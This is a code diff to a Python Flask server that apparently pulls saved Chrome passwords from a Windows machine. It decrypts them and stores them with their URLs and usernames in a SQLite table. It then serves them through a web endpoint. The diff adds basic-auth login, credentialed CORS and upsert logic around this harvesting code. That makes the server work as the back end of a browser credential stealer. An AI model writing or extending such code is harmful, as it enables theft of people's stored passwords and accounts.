@@ -31,7 +31,7 @@ elif platform.system() == 'Darwin':  # macOS
 load_dotenv()
 
 app = Flask(__name__)
-CORS(app)
+CORS(app, supports_credentials=True)
 
 DATABASE = 'database.db'
 PORT = int(os.environ.get('PORT', 5000))
@@ -53,7 +53,8 @@ def init_db():
                             url TEXT NOT NULL,
                             username TEXT,
                             password TEXT NOT NULL,
-                            timestamp TEXT DEFAULT CURRENT_TIMESTAMP
+                            timestamp TEXT DEFAULT CURRENT_TIMESTAMP,
+                            UNIQUE(url, username)
                         )
                         ''')
         conn.commit()
@@ -72,20 +73,49 @@ def get_db_connection():
         logger.error(f"Database connection error: {str(e)}")
         return None
 
-# Basic Admin Auth Decorator
+# Authentication decorator
 def require_admin(func):
     @wraps(func)
     def decorated_function(*args, **kwargs):
-        try:
-            auth = request.authorization
-            if not auth or auth.username != ADMIN_USERNAME or auth.password != ADMIN_PASSWORD:
-                logger.warning(f"Unauthorized access attempt from {request.remote_addr}")
-                return jsonify({"message": "Unauthorized"}), 401
-            return func(*args, **kwargs)
-        except Exception as e:
-            logger.error(f"Authentication error: {str(e)}")
-            return jsonify({"message": "Authentication error occurred"}), 500
+        auth = request.authorization
+        if not auth or auth.username != ADMIN_USERNAME or auth.password != ADMIN_PASSWORD:
+            logger.warning(f"Unauthorized access attempt from {request.remote_addr}")
+            return jsonify({"message": "Unauthorized"}), 401
+        return func(*args, **kwargs)
     return decorated_function
+
+# Login API
+@app.route('/api/login', methods=['POST'])
+def login():
+    # Get the Authorization header
+    auth_header = request.headers.get('Authorization', '')
+    
+    if auth_header.startswith('Basic '):
+        # Extract the base64 encoded credentials
+        encoded_credentials = auth_header[6:]  # Remove 'Basic '
+        
+        try:
+            # Decode the base64 string
+            decoded_credentials = base64.b64decode(encoded_credentials).decode('utf-8')
+            
+            # Split on colon to get username and password
+            username, password = decoded_credentials.split(':', 1)
+            
+            logger.info(f"Login attempt for user: {username}")
+            
+            # Verify credentials
+            if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
+                return jsonify({"message": "Login successful"}), 200
+        except Exception as e:
+            logger.error(f"Error decoding credentials: {str(e)}")
+    
+    return jsonify({"message": "Unauthorized"}), 401
+
+# Protected API
+@app.route('/api/protected', methods=['GET'])
+@require_admin
+def protected_route():
+    return jsonify({"message": "You have access!"})
 
 @app.route('/')
 def home():
@@ -171,7 +201,7 @@ def delete_all_user_data():
         logger.error(f"Unexpected error in delete_all_user_data: {str(e)}")
         return jsonify({"error": "An unexpected error occurred"}), 500
 
-def add_user_data(id, url, username, password, timestamp):
+def add_user_data(url, username, password, timestamp):
     try:
         # Insert the new record into the database
         conn = get_db_connection()
@@ -181,9 +211,9 @@ def add_user_data(id, url, username, password, timestamp):
             
         cursor = conn.cursor()
         cursor.execute('''
-            INSERT INTO decrypt_password (id, url, username, password, timestamp) 
-            VALUES (?, ?, ?, ?, ?)
-        ''', (id, url, username, password, timestamp))
+            INSERT OR REPLACE INTO decrypt_password (url, username, password, timestamp) 
+            VALUES (?, ?, ?, ?)
+        ''', (url, username, password, timestamp))
         conn.commit()
         conn.close()
         return True
@@ -309,7 +339,7 @@ def extract_windows_chrome_passwords():
                                 
                                 # Save to database
                                 timestamp = str(time.time())
-                                success = add_user_data(id=index, url=url, username=username, password=decrypted_password, timestamp=timestamp)
+                                success = add_user_data(url=url, username=username, password=decrypted_password, timestamp=timestamp)
                                 if success:
                                     results.append({"url": url, "username": username, "password": decrypted_password})
                                 
@@ -341,7 +371,8 @@ def user_password():
         system = platform.system()
         
         if system == 'Windows':
-            return extract_windows_chrome_passwords()
+            extract_windows_chrome_passwords()
+            return jsonify({"message": "User passwords update successfully"})
         elif system == 'Linux':
             return jsonify({"error": "Linux Chrome password extraction not implemented"}), 501
         elif system == 'Darwin':  # macOS
